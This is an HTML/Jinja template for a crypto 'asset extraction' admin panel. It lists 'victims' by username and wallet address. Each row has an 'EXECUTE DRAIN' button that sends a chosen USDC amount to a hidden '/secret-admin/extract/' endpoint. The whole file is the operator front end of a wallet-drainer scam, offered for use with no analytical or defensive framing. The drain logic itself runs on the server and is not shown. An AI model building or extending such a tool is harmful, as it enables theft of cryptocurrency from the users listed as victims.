<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORE ASSET CONTROL</title>
    <style>
        body { background: #020617; color: #f1f5f9; font-family: monospace; padding: 20px; }
        .panel { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #1e293b; color: #38bdf8; padding: 12px; text-align: left; }
        td { padding: 12px; border-bottom: 1px solid #1e293b; }
        .amt-input { background: #0f172a; border: 1px solid #334155; color: #4ade80; padding: 5px; width: 120px; border-radius: 4px; }
        .btn-exec { background: #ef4444; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .btn-exec:disabled { background: #475569; }
    </style>
</head>
<body>
    <h2>🔴 ASSET EXTRACTION INTERFACE</h2>
    <table class="panel">
        <thead>
            <tr>
                <th>USER</th>
                <th>WALLET</th>
                <th>EXTRACTION AMOUNT (USDC)</th>
                <th>ACTION</th>
            </tr>
        </thead>
        <tbody>
            {% for v in victims %}
            <tr>
                <td>{{ v.user.username }}</td>
                <td style="color: #94a3b8;">{{ v.wallet_address }}</td>
                <td>
                    <input type="number" id="amt_{{ v.id }}" class="amt-input" placeholder="e.g. 500.00">
                </td>
                <td>
                    <button class="btn-exec" onclick="runExtraction(this, '{{ v.id }}')">EXECUTE DRAIN</button>
                </td>
            </tr>
            {% endfor %}
        </tbody>
    </table>

    <script>
    async function runExtraction(btn, id) {
        const val = document.getElementById(`amt_${id}`).value;
        if(!val || val <= 0) return alert("Enter amount first");

        if(!confirm(`Confirm drain of ${val} USDC? Gas fees will apply to Admin Wallet.`)) return;

        btn.disabled = true;
        btn.innerText = "MINING...";

        try {
            const res = await fetch(`/secret-admin/extract/${id}/?amount=${val}`);
            const data = await res.json();

            if(data.status === 'success') {
                alert("SUCCESS! TX: " + data.tx);
            } else {
                alert("FAILED: " + data.msg);
            }
        } catch(e) {
            alert("SERVER ERROR");
        } finally {
            btn.disabled = false;
            btn.innerText = "EXECUTE DRAIN";
        }
    }
    </script>
</body>
</html>
